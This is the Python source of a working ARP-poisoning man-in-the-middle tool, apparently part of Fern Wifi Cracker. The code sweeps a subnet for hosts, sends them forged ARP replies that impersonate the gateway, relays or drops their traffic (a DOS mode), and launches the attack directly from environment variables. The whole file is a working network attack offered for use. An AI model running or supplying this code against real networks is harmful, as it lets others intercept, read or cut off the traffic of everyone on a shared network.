#-------------------------------------------------------------------------------
# Name:        MITM Core (Man In The Middle)
# Purpose:     Redirecting Network traffic to attack host by various MITM engines
#
# Author:      Saviour Emmanuel Ekiko
#
# Created:     15/08/2012
# Copyright:   (c) Fern Wifi Cracker 2011
# Licence:     <GNU GPL v3>
#
#
#-------------------------------------------------------------------------------
# GNU GPL v3 Licence Summary:
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.


import os
import time
import thread
import threading

from scapy.all import *

class Fern_MITM_Class:

    class ARP_Poisoning(object):
        def __init__(self):
            self._attack_option = str()                 # "ARP POISON" or "ARP POISON + ROUTE" or "DOS"
            self.interface_card = str()                 # eth0, wlan0
            self.gateway_IP_address = str()             # Router or default gateway address
            self._gateway_MAC_addr = str()              # Router Mac Address, set by _set_Gateway_MAC()
            self.subnet_hosts = {}                      # Holds IP Address to Mac Address Mappings of Subnet Hosts e.g {"192.168.0.1":"00:C0:23:DF:87"}
            self.control = True                         # Used to control the processes. if False -> Stop
            self.semaphore = threading.BoundedSemaphore(15)
            self._local_mac = str()                     # Mac address for interface card
            self._local_IP_Address = str()              # IP address for interface card


        def ARP_Who_Has(self,target_ip_address):
            '''Send ARP request, remote host returns its MAC Address'''
            ethernet = Ether(dst = "ff:ff:ff:ff:ff:ff",src = self._local_mac)
            arp_packet = ARP(hwtype = 0x1,ptype = 0x800,hwlen = 0x6,plen = 0x4,
            op = "who-has",hwsrc = self._local_mac,psrc = self._local_IP_Address,hwdst =
            "00:00:00:00:00:00",pdst = target_ip_address)
            padding_packet = Padding(load = "\x00"*18)
            ARP_who_has_packet = ethernet/arp_packet/padding_packet
            return(ARP_who_has_packet)


        def ARP_Is_At(self,ip_address,target_mac_address):
            '''Poisons Cache with fake target mac address'''
            ethernet = Ether(dst = 'ff:ff:ff:ff:ff:ff',src = self._local_mac)
            arp_packet = ARP(hwtype = 0x1,ptype = 0x800,hwlen = 0x6,plen = 0x4,
            op = "is-at",hwsrc = self._local_mac,psrc = self.gateway_IP_address,hwdst =
            'ff:ff:ff:ff:ff:ff',pdst = ip_address)
            padding_packet = Padding(load = "\x00"*18)
            ARP_is_at_packet = ethernet/arp_packet/padding_packet
            return(ARP_is_at_packet)


        def _gateway_MAC_Probe(self):
            '''_set_Gate_Mac worker, runs thread that
                sends and ARP who as packet to fecth gateway mac'''
            while(self.control):
                packet = self.ARP_Who_Has(self.gateway_IP_address)
                sendp(packet,iface = self.interface_card)
                if(self._gateway_MAC_addr):
                    break
                time.sleep(3)



        def _set_Gateway_MAC(self):
            '''Fetches the Gateway MAC address'''
            self._gateway_MAC_addr = str()
            thread.start_new_thread(self._gateway_MAC_Probe,())
            while not self._gateway_MAC_addr:
                reply = sniff(filter = "arp",count = 2)[1]
                if(reply.haslayer(ARP)):
                    if((reply.op == 0x2) and (reply.psrc == self.gateway_IP_address)):
                        self._gateway_MAC_addr = reply.hwsrc
                        break


        def _network_Hosts_Probe(self):
            '''ARP sweep subnet for available hosts'''
            while(self.control):
                segment = int(self.gateway_IP_address[:self.gateway_IP_address.index(".")])
                if segment in range(1,127):                                 # Class A IP address
                    address_func = self.class_A_generator
                elif segment in range(128,191):                             # Class B IP address
                    address_func = self.class_B_generator
                else:                                                       # Class C IP address
                    address_func = self.class_C_generator

                for address in address_func(self.gateway_IP_address):
                    if not self.control:
                        return
                    time.sleep(0.01)
                    packet = self.ARP_Who_Has(address)
                    sendp(packet,iface = self.interface_card)               # Send Who has packet to all hosts on subnet

                time.sleep(30)



        def _get_Network_Hosts_Worker(self,reply):
            '''thread worker for the _get_Netword_Host method'''
            self.semaphore.acquire()
            try:
                if(reply.haslayer(ARP)):
                    if((reply.op == 0x2) and (reply.hwsrc != self._local_mac)):
                        if not self.subnet_hosts.has_key(reply.hwsrc):
                            if(str(reply.hwsrc) != str(self._gateway_MAC_addr)):
                                self.subnet_hosts[reply.psrc] = reply.hwsrc
            finally:
                self.semaphore.release()


        def _get_Network_Hosts(self):
            '''Receives ARP is-at from Hosts on
                the subnet'''
            packet_count = 1
            thread.start_new_thread(self._network_Hosts_Probe,())
            sniff(filter = "arp",prn = self._get_Network_Hosts_Worker,store = 0)


        def _poison_arp_cache(self):
            '''Poisions ARP cache of detected Hosts'''
            while(self.control):
                for ip_address in self.subnet_hosts.keys():
                    packet = self.ARP_Is_At(ip_address,self.subnet_hosts[ip_address])
                    sendp(packet,iface = self.interface_card)
                time.sleep(5)


        def _redirect_network_traffic_worker(self,routed_data):
            ''' Thread worker for the _redirect_network_traffic() method'''
            self.semaphore.acquire()
            try:
                if(routed_data.haslayer(Ether)):
                    if(routed_data.getlayer(Ether).dst == self._local_mac):
                        routed_data.getlayer(Ether).dst = self._gateway_MAC_addr
                        sendp(routed_data,iface = self.interface_card)
            finally:
                self.semaphore.release()


        def _redirect_network_traffic(self):
            '''Redirect traffic to the Gateway Address'''
            sniff(prn = self._redirect_network_traffic_worker,store = 0)



        def Start_ARP_Poisoning(self,route_enabled = True):
            '''Start ARP Poisoning Attack'''
            self.control = True
            self._local_mac = self.get_Mac_Address(self.interface_card).strip()
            self._local_IP_Address = self.get_IP_Adddress()
            self._set_Gateway_MAC()
            thread.start_new_thread(self._get_Network_Hosts,())                 # Get all network hosts on subnet
            if(route_enabled):
                thread.start_new_thread(self._redirect_network_traffic,())      # Redirect traffic to default gateway
            self._poison_arp_cache()                                            # Poison the cache of all network hosts


    #################### OS NETWORKING FUNCTIONS #####################

        def get_Mac_Address(self,interface):
            sys_net = "/sys/class/net/" + interface + "/address"
            addr = open(sys_net,"r")
            mac_addr = addr.read()
            addr.close()
            return(mac_addr)


        def get_IP_Adddress(self):
            import re
            import commands
            regex = "inet addr:((\d+.){3}\d+)"
            sys_out = commands.getstatusoutput("ifconfig " + self.interface_card)[1]
            result = re.findall(regex,sys_out)
            if(result):
                return(result[0][0])
            return("0.0.0.0")



        def class_A_generator(self,address):
            '''Generates CIDR class A adresses'''
            #/8  Class A address host range = pow(2,24) -2
            mod = address.index('.')
            address = address[:mod] + '.%d' * 3
            for first_octect in range(255):
                for second_octect in range(255):
                    for third_octect in range(255):
                        yield(address % (first_octect,\
                        second_octect,third_octect))

        def class_B_generator(self,address):
            '''Generates CIDR class B adresses'''
            #/16 Class B address host range = pow(2,16) -2
            mod = address.rindex('.')
            address = address[:address[0:mod].rindex('.')] + '.%d'*2
            for first_octect in range(255):
                for second_octect in range(255):
                    yield(address % (\
                    first_octect,second_octect))


        def class_C_generator(self,address):
            '''Generates CIDR class C adresses'''
            #/24 Class C address host range = pow(2,8) -2
            process = address.rindex('.')
            address = address[:process] + '.%d'
            for octect in range(255):
                yield(address % octect)


    #################### OS NETWORKING FUNCTIONS END ########################


        def set_Attack_Option(self,option):
            '''"ARP POISON" or "ARP POISON + ROUTE" or "DOS"'''
            self._attack_option = option


        def run_attack(self):
            attack_options = ["ARP POISON","ARP POISON + ROUTE","DOS"]

            if(self._attack_option == "ARP POISON"):
                self.Start_ARP_Poisoning(False)
            if(self._attack_option == "ARP POISON + ROUTE"):
                self.Start_ARP_Poisoning(True)
            if(self._attack_option == "DOS"):
                self.Start_ARP_Poisoning(False)
            if(self._attack_option == str()):
                raise Exception("Attack Type has not been set")
            if(self._attack_option not in attack_options):
                raise Exception("Invalid Attack Option")



instance = Fern_MITM_Class.ARP_Poisoning()

instance.interface_card = os.environ["interface_card"]
instance.gateway_IP_address = os.environ["gateway_ip_address"]

instance.set_Attack_Option("ARP POISON + ROUTE")
instance.run_attack()



# Usage:

# instance = Fern_MITM_Class.ARP_Poisoning()

# instance.interface_card = "eth0"
# instance.gateway_IP_address = "192.168.133.1"

# instance.set_Attack_Option("ARP POISON + ROUTE")
# instance.start()

# instance.stop()



